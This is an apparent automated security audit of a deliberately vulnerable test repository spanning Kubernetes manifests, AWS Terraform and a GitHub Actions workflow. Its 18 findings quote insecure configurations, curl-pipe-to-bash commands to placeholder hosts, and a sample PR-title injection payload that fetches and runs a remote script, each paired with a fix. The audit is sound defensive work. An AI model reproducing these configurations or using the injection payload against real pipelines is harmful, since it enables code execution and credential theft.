# Security Audit — iac-vuln-app
Date: 2026-09-22 | Scope: working tree (repo @ v1.2.0) | Auditor: security-skills v1.2.0
Knowledge base: 30 vuln-db entries (newest 2026-09-11) | Live checks: OSV.dev + CISA KEV — NOT RUN (no network)

## Stack
Kubernetes (2 Deployments: `shop-api`, `url-fetcher`) + AWS Terraform (`main.tf`: security group, RDS postgres, launch template) + GitHub Actions deploy workflow. No application code, no dependency manifests. Cloud: AWS eu-west-1.

## Summary
| Severity | Count |
|---|---|
| Critical | 4 |
| High | 6 |
| Medium | 7 |
| Low | 1 |

## Findings

### SEC-001: Privileged container — CRITICAL
- **Where:** `deployment.yaml:14`
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **Evidence:**
  ```yaml
  securityContext:
    privileged: true              # SEC-1a: privileged container
  ```
- **Impact:** The container has all capabilities and host device access — a container escape or in-container compromise is immediately host root.
- **Fix:** Remove `privileged: true`; grant only the specific capabilities needed via `capabilities.add` (start from `drop: ["ALL"]`, as the hardened counterpart in this repo does).
- **References:** CWE-250; CIS Kubernetes Benchmark 5.2.1

### SEC-002: Host root filesystem mounted into pod — CRITICAL
- **Where:** `deployment.yaml:19-25`
- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **Evidence:**
  ```yaml
  volumeMounts:
    - name: hostroot
      mountPath: /host            # SEC-1e: host root mounted
  volumes:
    - name: hostroot
      hostPath:
        path: /
  ```
- **Impact:** Combined with SEC-001/SEC-003 (privileged + root), any code execution in the pod = full node takeover (write to host `/etc`, `/var/run/docker.sock`, chroot escape is trivial). Even without privileged, a writable hostPath leaks node secrets.
- **Fix:** Remove the hostPath entirely; use PVCs for persistence. If a node path is truly required, mount read-only a narrow subPath and document why.
- **References:** CWE-732

### SEC-003: Container runs as root — HIGH
- **Where:** `deployment.yaml:15` (and no pod-level `runAsNonRoot` at `deployment.yaml:9`)
- **CWE:** CWE-250
- **Evidence:**
  ```yaml
  runAsUser: 0                  # SEC-1c: runs as root
  ```
- **Impact:** In-container compromise executes as uid 0, amplifying SEC-001/SEC-002 and any writable-volume access.
- **Fix:** `securityContext: { runAsNonRoot: true, runAsUser: 10001 }` at pod level; image must ship a non-root USER.
- **References:** CIS K8s 5.2.5/5.2.6

### SEC-004: Rolling/unpinned image tag — MEDIUM
- **Where:** `deployment.yaml:12`
- **CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
- **Evidence:**
  ```yaml
  image: shop-api:latest
  ```
- **Impact:** Non-reproducible deploys — a retagged/poisoned image silently runs next push; rollback impossible.
- **Fix:** Pin by digest (`shop-api@sha256:…`) as `fetcher-deployment.yaml:12` correctly does.
- **References:** CWE-1104

### SEC-005: Plaintext secret in pod spec — MEDIUM (placeholder-shaped; Critical if deployed as-is with a real value)
- **Where:** `deployment.yaml:17-18`
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **Evidence:**
  ```yaml
  env:
    - name: DB_PASSWORD
      value: "Fake4EvalsDoNotUse"
  ```
- **Impact:** Credentials in pod specs are readable by anyone with `get pod`/`describe` RBAC and live in etcd unencrypted by default. The value looks like a placeholder — but the manifest as written deploys exactly this string as the DB password (config-hardening placeholder rule: "someone will temporarily deploy them").
- **Fix:** `valueFrom: { secretKeyRef: { name: shop-secrets, key: db-password } }` (the hardened counterpart shows the full form); source from a secret manager via External Secrets.
- **References:** CWE-798

### SEC-006: No resource limits on containers — LOW
- **Where:** `deployment.yaml:10-21`, `fetcher-deployment.yaml:9-15`
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Evidence:** No `resources:` block on either container spec (only the hardened counterpart sets limits).
- **Impact:** Noisy/Runaway pods starve node resources (DoS surface).
- **Fix:** Add `resources.requests/limits` to both deployments.

### SEC-007: Service account token automounted unnecessarily — MEDIUM
- **Where:** `deployment.yaml:9`, `fetcher-deployment.yaml:9` (neither pod sets `automountServiceAccountToken: false`)
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Evidence:** No `automountServiceAccountToken` key in either `template.spec`.
- **Impact:** Every pod carries a usable K8s API credential by default — a compromised container can act as its SA (lateral movement); neither workload appears to talk to the API.
- **Fix:** `automountServiceAccountToken: false` in both pod specs; dedicated SAs with minimal RBAC if API access is ever needed.

### SEC-008: Unrestricted egress for URL-fetching workload (no NetworkPolicy) — MEDIUM
- **Where:** `fetcher-deployment.yaml:5-15` (finding applies repo-wide: zero `kind: NetworkPolicy`/`policyTypes: Egress` in any manifest — verified by grep)
- **CWE:** CWE-284 (Improper Access Control)
- **Evidence:**
  ```yaml
  name: url-fetcher   # pod whose job is fetching URLs
  # (no NetworkPolicy anywhere restricts its egress)
  ```
- **Impact:** A URL-fetching pod can reach cloud metadata (169.254.169.254 — pairs with SEC-012 where IMDSv1 is allowed), every internal service, and arbitrary internet hosts. Any future user-URL feature becomes critical SSRF with no compensating control.
- **Fix:** Default-deny egress NetworkPolicy + allowlist (DNS, proxy, specific APIs).
- **References:** OWASP A10 (SSRF) — egress control layer

### SEC-009: SSH open to the internet — HIGH
- **Where:** `main.tf:8-13`
- **CWE:** CWE-668 (Exposure of Resource to Wrong Sphere)
- **Evidence:**
  ```hcl
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  ```
- **Impact:** Internet-wide brute force/credential stuffing on every instance in the SG; combined with SEC-012-era metadata issues, a single phished key exposes the workload.
- **Fix:** Restrict to bastion/VPN CIDRs; or use SSM Session Manager instead of SSH.
- **References:** CWE-668

### SEC-010: Database unencrypted at rest — HIGH
- **Where:** `main.tf:19`
- **CWE:** CWE-311 (Missing Encryption of Sensitive Data)
- **Evidence:**
  ```hcl
  storage_encrypted = false
  ```
- **Impact:** Snapshots/backups/underlying storage hold plaintext DB data (PII exposure path on snapshot leakage).
- **Fix:** `storage_encrypted = true` with a customer-managed KMS key.

### SEC-011: Hardcoded database password in Terraform — MEDIUM (placeholder-shaped; Critical if real)
- **Where:** `main.tf:21`
- **CWE:** CWE-798
- **Evidence:**
  ```hcl
  password = "Fake4EvalsDoNotUse"
  ```
- **Impact:** IaC-committed credentials persist in state files and every plan/apply log regardless of later source changes. Value is placeholder-shaped (triage per secrets-detection: does not "look real"), but the config deploys it verbatim as the RDS master password.
- **Fix:** `password = var.db_password` (or `manage_master_user_password = true` for AWS Secrets Manager); never commit the value. Rotate if any real value ever ran through this config.
- **References:** CWE-798

### SEC-012: IMDSv1 allowed on URL-fetching instances — HIGH
- **Where:** `main.tf:28-31`
- **CWE:** CWE-918 (SSRF) / metadata hardening
- **Evidence:**
  ```hcl
  metadata_options {
    http_endpoint = "enabled"
    http_tokens   = "optional"
  }
  ```
- **Impact:** IMDSv1 (tokenless) responses are obtainable via classic SSRF techniques; these launch-template instances run a URL-fetching workload (SEC-008) — metadata credential theft (IAM role creds) is one request away from any injected fetch.
- **Fix:** `http_tokens = "required"` + `http_put_response_hop_limit = 1`.
- **References:** AWS IMDSv2 guidance; OWASP A10

### SEC-013: curl | bash in instance bootstrap — HIGH
- **Where:** `main.tf:35`
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Evidence:**
  ```hcl
  curl -sSL https://install.example-fake.com/agent.sh | bash
  ```
- **Impact:** Compromise of the origin host (or DNS/MITM) = arbitrary code as root on every instance at boot; unpinned script, no checksum.
- **Fix:** Vendor the script in the AMI or fetch a checksum-pinned artifact; at minimum verify signatures before execution.

### SEC-014: `pull_request_target` + untrusted PR checkout + secrets — CRITICAL
- **Where:** `.github/workflows/deploy.yml:4,16,19-21`
- **CWE:** CWE-78 (OS Command Injection) / supply chain
- **Evidence:**
  ```yaml
  pull_request_target: # forks run with base-repo secrets
    types: [opened]
  ...
  ref: ${{ github.event.pull_request.head.sha }}
  ...
  ./deploy.sh ${{ secrets.DEPLOY_TOKEN }}
  ```
- **Impact:** Any fork can open a PR; the workflow checks out the attacker's commit but runs with base-repo secrets and a write-all token (SEC-016) — arbitrary code with repository credentials = secret exfiltration, malicious releases, repo takeover.
- **Fix:** `pull_request` (no secrets) for untrusted builds; if `pull_request_target` is unavoidable: never checkout head ref, never touch secrets, gate to labeled/trusted runs.
- **References:** GitHub Security Lab; KEV-pattern exploitation is routine

### SEC-015: Workflow script injection via PR title — CRITICAL
- **Where:** `.github/workflows/deploy.yml:18`
- **CWE:** CWE-78
- **Evidence:**
  ```yaml
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
  ```
- **Impact:** PR titles are attacker-controlled text; `${{ … }}` interpolation into `run:` substitutes BEFORE bash runs — a title like `$(curl evil.sh | sh)` executes in a job holding `secrets.DEPLOY_TOKEN` and write-all permissions.
- **Fix:** Pass through env, shell-quoted: `env: { TITLE: "${{ github.event.pull_request.title }}" }` then `echo "$TITLE"`. Same for body/comments/review text.
- **References:** CWE-78; GitHub script-injection advisory

### SEC-016: Overbroad workflow token — MEDIUM
- **Where:** `.github/workflows/deploy.yml:7-8`
- **CWE:** CWE-250
- **Evidence:**
  ```yaml
  permissions:
    contents: write-all
  ```
- **Impact:** Any compromise of a job step (see SEC-014/015) gets full repo write.
- **Fix:** Least privilege per job (`contents: read`, a dedicated deploy token scoped to the target).

### SEC-017: Action pinned by tag, not SHA — MEDIUM
- **Where:** `.github/workflows/deploy.yml:14`
- **CWE:** CWE-1104 / supply chain
- **Evidence:**
  ```yaml
  - uses: actions/checkout@v4
  ```
- **Impact:** Tag is mutable — a hijacked action repo serves malicious code under the same tag.
- **Fix:** Pin to full commit SHA (`actions/checkout@<sha>`).

### SEC-018: curl | sh in workflow — HIGH
- **Where:** `.github/workflows/deploy.yml:20`
- **CWE:** CWE-829
- **Evidence:**
  ```yaml
  curl -sSL https://install.example.com/bootstrap.sh | bash
  ```
- **Impact:** Remote-content execution inside the credentialed CI environment (stacks with SEC-014/015 into full CI compromise).
- **Fix:** Vendor/pin + checksum the bootstrap; or use a maintained action.

## What looks good
- `hardened-deployment.yaml` is the model spec: `runAsNonRoot`, `seccompProfile: RuntimeDefault`, digest-pinned image, `allowPrivilegeEscalation: false`, `readOnlyRootFilesystem: true`, `capabilities.drop: ["ALL"]`, secret via `secretKeyRef`, resource limits — audit other deployments against it.
- `fetcher-deployment.yaml` pins its image by digest (correct, unlike `shop-api`).
- No wildcard RBAC, no exposed LoadBalancer services, no secrets in ConfigMaps.
- Terraform has no committed `.tfstate`, no hardcoded cloud access keys.

## Not assessed (completeness gate)
- A06 (dependencies): no manifests in scope. A07/A01 (auth/authz): no application code. A09 (logging/alerting): no logging config present. Live OSV/KEV: no network this run.

## Recommended fix order
1. SEC-014 + SEC-015 (CI compromise chain — credentials theft, S effort) → then SEC-016/017/018 in the same PR
2. SEC-001 + SEC-002 + SEC-003 (node-takeaway chain, S/M effort)
3. SEC-005 + SEC-011 (move secrets to Secret store / TF var, S effort; rotate if ever real)
4. SEC-012 (IMDSv2 required — one line) and SEC-009 (SSH CIDRs)
5. SEC-010 (encryption), SEC-008 (egress NetworkPolicy)
6. Remaining mediums/lows (SEC-004, 006, 007) in normal hardening passes
